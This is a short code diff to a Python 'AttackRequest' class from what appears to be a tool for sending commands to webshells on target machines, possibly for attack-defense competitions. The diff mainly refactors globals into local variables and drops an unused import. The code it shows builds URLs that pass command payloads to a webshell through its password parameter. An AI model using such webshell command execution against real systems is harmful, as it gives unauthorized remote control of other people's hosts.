@@ -1,7 +1,7 @@
 import base64
 import random
 import requests
-import libs.Models
+
 from config.config import Config
 from libs.OutputColor import Color
 
@@ -9,7 +9,6 @@ from libs.OutputColor import Color
 class AttackRequest:
     def __init__(self):
         self.login = False
-        self.Targets = libs.Models.Targets()
         self.session = requests.session()
         self.user_agent_list = [
             'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95',
@@ -107,10 +106,6 @@ class AttackRequest:
 
 
     def handle_execute_command(self, target, webshell, payload):
-        global url
-        global result
-        global response
-
         webshell_path = webshell['WebShell_path']
         webshell_type = webshell['WebShell_type']
         webshell_passwd = webshell['WebShell_passwd']
@@ -126,6 +121,8 @@ class AttackRequest:
         else:
             payload = 'echo \'*----START----*\'' + payload + ';echo \'*----END----*\';'
 
+        url = None
+        response = None
         if webshell_request == 'GET':
             url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
             url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
@@ -153,6 +150,7 @@ class AttackRequest:
             except requests.Timeout:
                 print(Color('Connect failed, Timeout!', 'red').print())
 
+        result = None
         if response:
             result = self.handle_response(response)
             if result or result == '':
